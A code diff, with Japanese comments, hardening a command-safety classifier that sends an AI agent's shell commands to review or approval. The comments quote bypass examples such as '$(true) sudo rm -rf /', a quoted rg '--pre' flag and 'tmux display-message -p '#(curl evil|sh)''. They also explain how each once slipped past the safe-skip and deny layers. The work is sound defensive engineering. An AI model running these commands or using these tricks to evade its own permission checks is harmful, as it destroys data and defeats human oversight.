@@ -44,6 +44,7 @@ import json
 import os
 import platform
 import re
+import shlex
 import subprocess
 import tempfile
 import time
@@ -188,6 +189,14 @@ _GLOBAL_VALUE_FLAGS = {
 
 _ENV_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
 
+# 実行体の位置に現れる「静的に中身を確定できない」トークン。$VAR / ${VAR} /
+# $(...) / `...` は展開結果が空になり得て、その場合シェルはそのトークンごと
+# 消して次のトークンを実行する (`$(true) sudo rm -rf /` は実際には
+# `sudo rm -rf /` が走る)。展開トークンを実行体と誤認すると分類が "" になり、
+# 必ず ask のはずの高リスク層と即拒否の DENY 層を同時に素通りして単独モデルの
+# fast path へ落ちる。確定できない以上は安全側 (判定不能 → ask) に倒す。
+_UNRESOLVABLE_EXPANSION = re.compile(r"[$`]")
+
 # クォート/バックスラッシュはシェル解釈で消えるため、実行体名の照合前に
 # 除去して正規化する (`su''do` / `s\u\d\o` のような分割難読化への対処)。
 # _is_sensitive_command / _references_out_of_tree_path と同じ設計原則。
@@ -197,6 +206,27 @@ _QUOTE_OR_ESCAPE = re.compile(r"[\"'\\]")
 def _normalize_cmd(cmd: str) -> str:
     """クォート/バックスラッシュを除去してシェル解釈後のトークンに近づける。"""
     return _QUOTE_OR_ESCAPE.sub("", cmd)
+
+
+def _tokenize(cmd: str) -> list[str]:
+    """シェルの語分割規則でトークン列に分解する。
+
+    _normalize_cmd + split() は「クォートを文字として消してから空白で割る」ため、
+    値に空白を含むクォート (`FOO="a b" rm -rf ./x`) では語境界まで壊れる。
+    `FOO=a`, `b`, `rm`, ... と割れてしまい、代入を読み飛ばした先の `b` を実行体と
+    誤認して分類が空になる = DENY と高リスクの両層を同時にすり抜ける。
+    (`FOO=1 rm -rf x` のように値に空白が無い場合だけ偶然正しく動いていた。)
+
+    shlex はクォート内の空白を保ったまま `su''do` / `s\\u\\d\\l` のような分割
+    難読化も連結して解決するので、既存の難読化耐性を落とさずに語境界だけを
+    正しくできる。未閉鎖クォート等で shlex が解釈できない入力は従来の
+    正規化 + split にフォールバックする (例外で判定不能にするより、既存の
+    保守的な経路へ流す方が呼び出し側のフェイルセーフと噛み合う)。
+    """
+    try:
+        return shlex.split(cmd)
+    except ValueError:
+        return _normalize_cmd(cmd).split()
 
 
 def _split_prefix(tokens: list[str]) -> list[str] | None:
@@ -213,6 +243,10 @@ def _split_prefix(tokens: list[str]) -> list[str] | None:
         if _ENV_ASSIGNMENT.match(tok):
             i += 1
             continue
+        if _UNRESOLVABLE_EXPANSION.search(tok):
+            # 展開トークンが実行体の位置にある: 空展開なら次のトークンが実行体に
+            # なるため、このトークンを実行体と決め打ちできない (上の定義参照)。
+            return None
         base = tok.rsplit("/", 1)[-1]
         if base in _WRAPPER_EXECUTABLES:
             valueless = _WRAPPER_VALUELESS_FLAGS.get(base, frozenset())
@@ -234,7 +268,7 @@ def _resolve_executable(cmd: str) -> str:
     する。解決できない場合は空文字を返し、呼び出し側は照合失敗 (= AI レビュー
     行き) として扱う。
     """
-    rest = _split_prefix(_normalize_cmd(cmd).split())
+    rest = _split_prefix(_tokenize(cmd))
     if not rest:
         return ""
     return rest[0].rsplit("/", 1)[-1]
@@ -512,8 +546,16 @@ _RG_DANGEROUS_FLAGS = frozenset(
 
 
 def _has_dangerous_rg_flag(cmd: str) -> bool:
-    """rg コマンドが任意実行/任意読取を許すフラグを含むか判定する。"""
-    tokens = cmd.split()
+    """rg コマンドが任意実行/任意読取を許すフラグを含むか判定する。
+
+    照合前に _normalize_cmd でクォート/バックスラッシュを除去する。シェルは
+    `rg '--pre' sh` を `rg --pre sh` と同じに解釈するため、生文字列のまま
+    トークン比較すると `'--pre'` が未知トークン扱いになり、この関数だけが
+    False を返してセーフスキップ (= AI レビュー完全回避) を許してしまう。
+    _resolve_executable / _is_sensitive_command / _references_out_of_tree_path
+    と同じ正規化の設計原則をここにも適用する。
+    """
+    tokens = _tokenize(cmd)
     if not tokens or tokens[0] != "rg":
         return False
     for tok in tokens[1:]:
@@ -528,6 +570,30 @@ def _has_dangerous_rg_flag(cmd: str) -> bool:
     return False
 
 
+# tmux の FORMATS は `#(shell-command)` でシェルコマンドを実行する
+# (man tmux: "a command may be executed and its output inserted using '#()'")。
+# つまり SAFE_COMMANDS に載せた display-message / list-* / capture-pane 等の
+# 「読み取り系」サブコマンドは、フォーマット文字列を伴わない限りでのみ読み取り系
+# であって、`tmux display-message -p '#(curl evil|sh)'` は任意コード実行になる。
+# COMPLEX_SHELL_SYNTAX は `$(` やバッククォートは見るが `#(` は見ず、シングル
+# クォート内なので _split_top_level も分割しないため、セーフスキップを素通りして
+# AI レビューを丸ごと回避できてしまう。rg の危険フラグと同じ扱いでレビューへ回す。
+_TMUX_FORMAT_EXEC = re.compile(r"#\(")
+
+
+def _has_tmux_format_exec(cmd: str) -> bool:
+    """tmux コマンドがフォーマット経由のコマンド実行 `#(...)` を含むか判定する。
+
+    クォート/バックスラッシュを除去した正規化文字列でも照合する
+    (`'#\\(id)'` のような分割での回避防止。誤検知はレビュー行きになるだけ)。
+    """
+    if _resolve_executable(cmd) != "tmux":
+        return False
+    return bool(
+        _TMUX_FORMAT_EXEC.search(cmd) or _TMUX_FORMAT_EXEC.search(_normalize_cmd(cmd))
+    )
+
+
 def _is_safe_command(cmd: str) -> bool:
     # 機密パスを含む場合はセーフ扱いにせず AI レビューへ回す (Read deny の迂回防止)
     if _is_sensitive_command(cmd):
@@ -537,6 +603,9 @@ def _is_safe_command(cmd: str) -> bool:
         return False
     # rg の任意実行/任意読取フラグはセーフスキップさせない (上の定義参照)
     if _has_dangerous_rg_flag(cmd):
+        return False
+    # tmux のフォーマット経由コマンド実行 `#(...)` も同様 (上の定義参照)
+    if _has_tmux_format_exec(cmd):
         return False
     if cmd in SAFE_EXACT_COMMANDS:
         return True
@@ -633,7 +702,7 @@ def _high_risk_label(cmd: str) -> str:
     で高リスク (ask) に倒す。剥がしを省くと `env rm -rf ./x` が高リスク層を
     素通りして単独モデルの fast path に流れてしまう (必ず ask の保証が破れる)。
     """
-    tokens = _normalize_cmd(cmd).split()
+    tokens = _tokenize(cmd)
     if not tokens:
         return ""
     rest = _split_prefix(tokens)
@@ -664,6 +733,14 @@ def _high_risk_label(cmd: str) -> str:
         return ""
     if exe in _PKG_INSTALL_SUBCOMMANDS and sub in _PKG_INSTALL_SUBCOMMANDS[exe]:
         return f"{exe} {sub}"
+    # `python -m pip install` は `pip install` と全く同じサプライチェーン操作
+    # なので同じラベルに寄せる。`-m` 自体は引き金にせず (python -m http.server /
+    # -m pytest は通常運用)、モジュールが pip でサブコマンドが install の
+    # 場合だけ拾う。`uv pip install` を個別判定しているのと同じ粒度。
+    if _VERSION_SUFFIX.sub("", exe) == "python" and "-m" in rest:
+        module_args = rest[rest.index("-m") + 1 :]
+        if module_args[:2] == ["pip", "install"]:
+            return "pip install"
     if exe == "uv" and rest[:2] == ["pip", "install"]:
         return "uv pip install"
     if exe in ("pnpm", "yarn") and sub == "dlx":
